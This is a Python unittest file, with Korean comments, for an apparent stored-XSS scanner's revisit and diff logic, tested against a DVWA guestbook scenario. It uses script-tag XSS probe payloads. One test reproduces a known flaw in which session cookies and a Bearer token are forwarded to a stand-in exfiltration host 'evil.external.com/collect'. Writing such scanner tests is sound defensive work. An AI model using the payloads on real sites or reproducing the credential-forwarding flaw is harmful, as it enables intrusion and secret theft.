from __future__ import annotations

import concurrent.futures
import unittest

from analyzer.xss.revisit import (
    REVISIT_MAX_RETRY,
    RefetchResult,
    diff_new_region,
    new_run_marker_factory,
    refetch,
)

PAYLOAD = "<script>ibdsXSS</script>"


class _RetryRequester:
    """reflect_from회차부터 응답에 payload를 반사하는 가짜 전송기. GET 호출 횟수를 센다.
    reflect_from=0 이면 끝까지 미반사."""

    def __init__(self, reflect_from: int, payload: str = PAYLOAD):
        self.reflect_from = reflect_from
        self.payload = payload
        self.calls = 0
        self.sent: list = []

    def send(self, case, zap):
        self.calls += 1
        self.sent.append(case)
        body = "<html><body>base</body></html>"
        if self.reflect_from and self.calls >= self.reflect_from:
            body = f"<html><body>{self.payload}</body></html>"
        return {"response_body": body, "response_status": 200}


class RefetchTests(unittest.TestCase):
    def test_first_try_hit_stops_immediately(self) -> None:
        r = _RetryRequester(reflect_from=1)
        res = refetch("http://x/list", {}, PAYLOAD, r, zap=None, await_ms=0)

        self.assertIsInstance(res, RefetchResult)
        self.assertTrue(res.found)
        self.assertEqual(res.attempts, 1)   # 첫 GET 포함 = 1
        self.assertEqual(r.calls, 1)        # 조기 종료 → 추가 GET 없음
        self.assertIn(PAYLOAD, res.body)
        self.assertEqual(res.status, 200)

    def test_late_hit_counts_total_attempts(self) -> None:
        r = _RetryRequester(reflect_from=2)
        res = refetch("http://x/list", {}, PAYLOAD, r, zap=None, await_ms=0)

        self.assertTrue(res.found)
        self.assertEqual(res.attempts, 2)   # 총 시도 횟수 = 2 (재시도만 아님)
        self.assertEqual(r.calls, 2)

    def test_never_reflected_exhausts_retries(self) -> None:
        r = _RetryRequester(reflect_from=0)
        res = refetch("http://x/list", {}, PAYLOAD, r, zap=None, max_retry=3, await_ms=0)

        self.assertFalse(res.found)         # inconclusive 판정 근거
        self.assertEqual(res.attempts, 3)
        self.assertEqual(r.calls, 3)

    def test_default_max_retry_is_three(self) -> None:
        self.assertEqual(REVISIT_MAX_RETRY, 3)

    # af.md #4 재현: refetch()는 response_status를 판정에 전혀 쓰지 않는다.
    # 403(차단)이든 200(진짜 미탐지)이든 payload가 없으면 found=False로 똑같이 나오고,
    # 호출부(family_pipeline._judge_stored)는 이 경우를 구분 없이 "정상 방어"로 해석한다.
    # 재조회 응답의 유효성(상태 코드·인증 상태)을 먼저 확인하는 처리가 없음 — 수정 예정(2일차, af.md #4).
    def test_error_status_and_genuine_miss_are_indistinguishable_bug(self) -> None:
        class _StatusRequester:
            def __init__(self, status: int):
                self.status = status

            def send(self, case, zap):
                return {"response_body": "<html>blocked</html>", "response_status": self.status}

        blocked = refetch("http://x/list", {}, PAYLOAD, _StatusRequester(403), zap=None, await_ms=0)
        genuine_miss = refetch("http://x/list", {}, PAYLOAD, _StatusRequester(200), zap=None, await_ms=0)

        self.assertFalse(blocked.found)
        self.assertFalse(genuine_miss.found)
        self.assertEqual(blocked.status, 403)  # status는 결과에 담기지만
        self.assertEqual(blocked.attempts, genuine_miss.attempts)  # 판정 흐름(재시도 횟수)은 둘 다 동일하게 취급됨

    def test_get_request_targets_revisit_url(self) -> None:
        r = _RetryRequester(reflect_from=1)
        refetch("http://x/list", {"SID": "abc"}, PAYLOAD, r, zap=None, await_ms=0)

        sent = r.sent[0]
        self.assertEqual(sent.method, "GET")
        self.assertEqual(sent.url, "http://x/list")

    def test_backoff_grows_linearly(self) -> None:
        # 백오프 500ms×n: 1차 재시도 앞 0.5s, 2차 재시도 앞 1.0s (WBS/TASK 기준)
        import analyzer.xss.revisit as rv
        captured: list[float] = []
        orig_sleep = rv.time.sleep
        rv.time.sleep = lambda s: captured.append(s)
        try:
            refetch("http://x/list", {}, PAYLOAD, _RetryRequester(reflect_from=0),
                    zap=None, max_retry=3, await_ms=500)
        finally:
            rv.time.sleep = orig_sleep
        self.assertEqual(captured, [0.5, 1.0])


class RevisitCredentialScopeTests(unittest.TestCase):
    # af.md #8 재현: revisit_url이 원본과 다른 외부 호스트여도 원본 쿠키·인증 헤더가
    # 목적지 구분 없이 그대로 실려 나간다 — 재방문 목적지 허용 범위 검사가 없음.
    # 수정 예정(2일차, af.md #8).
    def test_refetch_sends_original_credentials_to_any_host_bug(self) -> None:
        captured: dict = {}

        class _CapturingRequester:
            def send(self, case, zap):
                captured["url"] = case.url
                captured["cookies"] = case.cookies
                captured["headers"] = case.headers
                return {"response_body": "", "response_status": 200}

        original_cookies = {"SESSIONID": "secret-auth-token"}
        target = {"headers": {"Authorization": "Bearer secret"}}

        refetch("http://evil.external.com/collect", original_cookies, None,
                _CapturingRequester(), zap=None, target=target, max_retry=1)

        self.assertEqual(captured["url"], "http://evil.external.com/collect")
        self.assertEqual(captured["cookies"], original_cookies)
        self.assertEqual(captured["headers"].get("Authorization"), "Bearer secret")


class DiffNewRegionTests(unittest.TestCase):
    def setUp(self) -> None:
        self.before = "line1\nline2\n<p>old_stored</p>"

    def test_no_change_returns_none(self) -> None:
        self.assertIsNone(diff_new_region(self.before, self.before))

    def test_new_line_extracted(self) -> None:
        after = self.before + "\n<p>NEW</p>"
        self.assertEqual(diff_new_region(self.before, after), "<p>NEW</p>")

    def test_only_old_residue_returns_none(self) -> None:
        # 과거 잔재는 before에 이미 있어 '새 것'으로 안 센다 (diff가 빼버림)
        same = "line1\nline2\n<p>old_stored</p>"
        self.assertIsNone(diff_new_region(self.before, same))

    def test_replaced_line_returns_changed_after_line(self) -> None:
        self.assertEqual(diff_new_region("a\nb\nc", "a\nB\nc"), "B")

    def test_multiple_new_lines_joined(self) -> None:
        after = self.before + "\n<p>N1</p>\n<p>N2</p>"
        self.assertEqual(diff_new_region(self.before, after), "<p>N1</p>\n<p>N2</p>")

    def test_empty_inputs_return_none(self) -> None:
        self.assertIsNone(diff_new_region("", ""))


class M2ScenarioTests(unittest.TestCase):
    """M2 검증 시나리오 문서를 diff/refetch 단위로 재현 (DVWA 방명록 기준)."""

    GB_BEFORE = "<h1>Guestbook</h1>\n<div>name: alice msg: hello</div>"

    def test_scenario1_echoback_no_storage_is_safe(self) -> None:
        # 시나리오1: 저장 안 됨 → after GET == before GET → diff 없음 → safe
        after = self.GB_BEFORE  # POST 응답에만 에코, 재조회 GET엔 반영 안 됨
        self.assertIsNone(diff_new_region(self.GB_BEFORE, after))

    def test_scenario2_real_storage_new_region_has_payload(self) -> None:
        # 시나리오2: 실제 저장 → 새 영역에 payload 존재 → vulnerable 경로로 진행
        payload = "<script>alert(1)</script>"
        after = self.GB_BEFORE + f"\n<div>name: bob msg: {payload}</div>"
        region = diff_new_region(self.GB_BEFORE, after)
        self.assertIsNotNone(region)
        self.assertIn(payload, region)

    def test_scenario3_residue_not_attributed(self) -> None:
        # 시나리오3: Phase1 마커 잔재가 before에 이미 있음 → 새 것만 잡히고 잔재는 제외
        before = self.GB_BEFORE + "\n<div>name: x msg: ibds1234p00n0001</div>"
        payload = "<script>alert(2)</script>"
        after = before + f"\n<div>name: y msg: {payload}</div>"
        region = diff_new_region(before, after)
        self.assertEqual(region, f"<div>name: y msg: {payload}</div>")
        self.assertNotIn("ibds1234p00n0001", region)

    def test_scenario3_residue_only_is_none(self) -> None:
        # 시나리오3 변형: 잔재만 있고 이번엔 아무것도 안 심김 → diff 공집합 → safe
        before = self.GB_BEFORE + "\n<div>ibds1234p00n0001</div>"
        self.assertIsNone(diff_new_region(before, before))

    def test_scenario2_storage_delay_then_appears(self) -> None:
        # 저장 반영 지연: 1회차엔 없고 2회차에 payload 등장 → 적응형 재시도가 잡음
        payload = "<script>alert(1)</script>"
        res = refetch("http://x/xss_s/", {}, payload,
                      _RetryRequester(reflect_from=2, payload=payload), zap=None, await_ms=0)
        self.assertTrue(res.found)
        self.assertEqual(res.attempts, 2)


class MarkerFactoryTests(unittest.TestCase):
    def test_counter_increments_per_param(self) -> None:
        mf = new_run_marker_factory(run_hex="beef")
        self.assertEqual(mf.issue("txtName"), "ibdsbeefp00n0001")
        self.assertEqual(mf.issue("txtName"), "ibdsbeefp00n0002")
        self.assertEqual(mf.issue("mtxMessage"), "ibdsbeefp01n0001")

    def test_markers_unique_under_concurrency(self) -> None:
        mf = new_run_marker_factory()
        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
            issued = list(ex.map(lambda _: mf.issue("p"), range(2000)))
        self.assertEqual(len(set(issued)), 2000)


if __name__ == "__main__":
    unittest.main()
